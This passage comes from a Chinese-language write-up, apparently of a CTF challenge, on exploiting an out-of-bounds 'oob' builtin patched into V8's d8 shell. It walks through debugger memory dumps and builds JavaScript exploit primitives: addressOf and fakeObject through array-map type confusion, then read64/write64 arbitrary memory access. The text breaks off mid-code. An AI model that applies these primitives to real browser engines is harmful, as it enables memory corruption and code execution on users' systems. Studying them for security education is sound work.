<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] oob return data:"</span> + data.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.release$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">0x2c5f52b0de29 &lt;JSArray[3]&gt;</span><br><span class="line">&#x2F;&#x2F;打印对象内存地址</span><br><span class="line">pwndbg&gt; telescope 0x2c5f52b0de29-1</span><br><span class="line">00:0000│   0x2c5f52b0de28 —▸ 0x344502282ed9 ◂— 0x400003ee9994c01    &lt;&#x3D; 对象的map                                    nmap</span><br><span class="line">01:0008│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08         &lt;&#x3D; prototype	</span><br><span class="line">02:0010│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14			&lt;&#x3D; element</span><br><span class="line">03:0018│   0x2c5f52b0de40 ◂— 0x300000000							&lt;&#x3D; length</span><br><span class="line">04:0020│   0x2c5f52b0de48 ◂— 0x0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;打印element内存地址</span><br><span class="line">pwndbg&gt; telescope 0x2c5f52b0de01-1</span><br><span class="line">00:0000│   0x2c5f52b0de00 —▸ 0x3ee9994c14f9 ◂— 0x3ee9994c01			 </span><br><span class="line">01:0008│   0x2c5f52b0de08 ◂— 0x300000000							 &lt;&#x3D; length</span><br><span class="line">02:0010│   0x2c5f52b0de10 ◂— 0x3ff199999999999a						 &lt;&#x3D; 第一个值</span><br><span class="line">03:0018│   0x2c5f52b0de18 ◂— 0x400199999999999a						 &lt;&#x3D; 第二个值</span><br><span class="line">04:0020│   0x2c5f52b0de20 ◂— 0x400a666666666666 (&#39;ffffff\n@&#39;)        &lt;&#x3D; 第二个值</span><br><span class="line">05:0028│   0x2c5f52b0de28 —▸ 0x344502282ed9 ◂— 0x400003ee9994c01	 &lt;&#x3D;对象的map</span><br><span class="line">06:0030│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08</span><br><span class="line">07:0038│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde10</span><br><span class="line">$1 &#x3D; 1.1000000000000001</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde18</span><br><span class="line">$2 &#x3D; 2.2000000000000002</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x71b3a0cde20</span><br><span class="line">$3 &#x3D; 3.2999999999999998</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob return data:2.8394443558087e-310&#x2F;&#x2F;和泄漏出来的一样</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x2c5f52b0de28</span><br><span class="line">$2 &#x3D; 2.8394443558087202e-310</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">pwndbg&gt; telescope 0x2c5f52b0de01-1</span><br><span class="line">00:0000│   0x2c5f52b0de00 —▸ 0x3ee9994c14f9 ◂— 0x3ee9994c01</span><br><span class="line">01:0008│   0x2c5f52b0de08 ◂— 0x300000000</span><br><span class="line">02:0010│   0x2c5f52b0de10 ◂— 0x3ff199999999999a</span><br><span class="line">03:0018│   0x2c5f52b0de18 ◂— 0x400199999999999a</span><br><span class="line">04:0020│   0x2c5f52b0de20 ◂— &#39;ffffff\n@&#39;</span><br><span class="line">05:0028│   0x2c5f52b0de28 ◂— 0x4000000000000000</span><br><span class="line">06:0030│   0x2c5f52b0de30 —▸ 0x3ee9994c0c71 ◂— 0x3ee9994c08</span><br><span class="line">07:0038│   0x2c5f52b0de38 —▸ 0x2c5f52b0de01 ◂— 0x3ee9994c14</span><br><span class="line">pwndbg&gt; p &#123;double &#125; 0x2c5f52b0de28</span><br><span class="line">$3 &#x3D; 2&#x2F;&#x2F;被覆盖了</span><br></pre></td></tr></table></figure>

<p><strong>关联</strong></p>
<blockquote>
<p>为kArrayOob类型做了与实现函数的关联：</p>
</blockquote>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">src/builtins/builtins-definitions.h</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line"></span><br><span class="line">/src/compiler/typer.cc</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><p>由于v8完全依赖Map类型对js对象进行解析。</p>
<p>所以，我们通过修改对象的map，将对象数组的map设置为浮点数组的map，就能让v8解析原来的对象数组的时候，解析成为浮点数组，反之同理。由于两种数组内部存储的不同，可以实现一些小功能。</p>
<ul>
<li><p>对象数组存储的是每个对象的地址，也就是对象数组存的是地址。</p>
</li>
<li><p>浮点数组存储的是浮点型是的数值。</p>
</li>
</ul>
<h4 id="addressOf"><a href="#addressOf" class="headerlink" title="addressOf"></a>addressOf</h4><blockquote>
<p>泄露某个对象的内存地址，日后可以实现任意地址读的功能。</p>
</blockquote>
<p>因为对象数组存储的是地址，但是如果v8解析是对象数组的话，肯定就不会输出这个地址，而是找到这个对象再操作。但是，如果，让v8误以为这是一个浮点数组，那么，v8就把把这个地址当作是浮点数，以浮点数的形式将对象数组里面存储的对象地址输出了。</p>
<p>所以，步骤如下：</p>
<p>1.拿到要泄漏的地址</p>
<p>2.把这个地址，覆盖已经创建好的对象数组第一个元素obj_array[0]（让地址成为对象数组的一员）</p>
<p>3.将对象数组的map替换为浮点数组的map</p>
<p>4.输出数组的第一个元素，此时，就会按照浮点形式，将地址里的内容输出出来。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="fakeObject"><a href="#fakeObject" class="headerlink" title="fakeObject"></a>fakeObject</h4><blockquote>
<p>将指定内存地址强制转换为一个js对象，日后可以实现任意地址写的功能。</p>
</blockquote>
<p>现在，有了地址，地址是一个整数，整数可以直接变成以浮点数表示，但是不能变成对象，所以还是需要混淆。</p>
<p>步骤：</p>
<p>1.拿到地址，转换为浮点数表示。</p>
<p>2.放入浮点数组第一个位置中。</p>
<p>3.将浮点数组的map替换为对象数组的map</p>
<p>4.数组的第一个位置上，内存地址就已经变成一个js对象了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="辅助的工具函数"><a href="#辅助的工具函数" class="headerlink" title="辅助的工具函数"></a>辅助的工具函数</h4><p>浮点数转整数、整数转浮点数、字节串表示整数</p>
<p>实现方法：开辟一块空间，创建两个数组，分别是浮点数组float64和整数数组bigUint64，他们公用创造的那块空间。</p>
<p>这样，根据原来的形式放入对应的数组，用转换的数组输出即可。</p>
<p>例如：f2i()，要将浮点数转换为整数，只要将浮点数放入浮点数组，然后用整数数组输出，因为空间是一个，所以，输入输出的是同一个值，但由于数组的属性不同，会按数组的属性进行解释，进来的时候是浮点数，比如存入了0001H单元，然后输出的时候，还会读这个0001H单元，但是这个时候，用的是整数数组，所以会把它以整数的格式输出。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整合在一起调试：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××3. 测试××××××××</span></span><br><span class="line"><span class="keyword">var</span> test_obj = &#123;&#125;;</span><br><span class="line">%DebugPrint(test_obj);</span><br><span class="line"><span class="keyword">var</span> test_obj_addr = addressOf(test_obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak object addr: 0x"</span> + hex(test_obj_addr));</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">0x189f4fdcf201 &lt;Object map &#x3D; 0x2ded805c0459&gt;</span><br><span class="line">[*] leak object addr: 0x0000189f4fdcf200</span><br></pre></td></tr></table></figure>

<p>成功泄漏对象的地址。同样，利用fakeObject可以将某个内存地址转换为一个object对象。</p>
<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><blockquote>
<p>我们首先构造一个假的数组对象，我们可以用fakeObject将其转换为一个object对象。因为自己构造的elements指针是可控的，而这个指针是指向存储数组元素内容的内存地址。所以，只要在elements上放入我们想要读写的地址，就可以用对象进行读写操作了。</p>
</blockquote>
<p>步骤：</p>
<p>1.利用可控内存，伪造自己的对象结构。</p>
<p>2.将自己伪造的对象结构转换为真的对象。</p>
<p><img src="/2020/10/23/17-42-undefined/image-20201016182937097.png" alt="image-20201016182937097"></p>
<p>我们伪造的是一个对象在内存中的表示，只有这样，elements才是我们自己可以填的。通过addressOf找到是，伪造的对象数组在内存中的地址，也就是他的对象结构开头，真实存储的内容在<strong>泄漏的地址-伪造的长度（6×0x8）</strong>，然后我们要让v8认为真实存储的内容是一个对象，所以对<strong>泄漏的地址-伪造的长度（6×0x8）</strong>做fakeObject，那么，我们构造的这个数组，就真的成为了一个对象在内存的表示。</p>
<p>3.任意地址读。给定的地址是要读的地址，elements在读写的数据-0x10。把这个伪造的elements给伪造的内存，然后利用上述第二步，变成一个对象（fake_object是用fake_array出来的），读取对象的元素，就是地址的内容了。</p>
<p><img src="/2020/10/23/17-42-undefined/image-20201016185416667.png" alt="image-20201016185416667"></p>
<p>4.任意地址写也是一样。把地址变成一个对象，那么要写入的地址就是我们对象的数据了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// read &amp; write anywhere</span></span><br><span class="line"><span class="comment">// 这是一块我们可以控制的内存</span></span><br><span class="line"><span class="keyword">var</span> fake_array = [				<span class="comment">//伪造一个对象</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="comment">// 任意地址读</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 任意地址写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>整合测试一下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××3.read &amp; write anywhere××××××××</span></span><br><span class="line"><span class="comment">// 这是一块我们可以控制的内存</span></span><br><span class="line"><span class="keyword">var</span> fake_array = [				<span 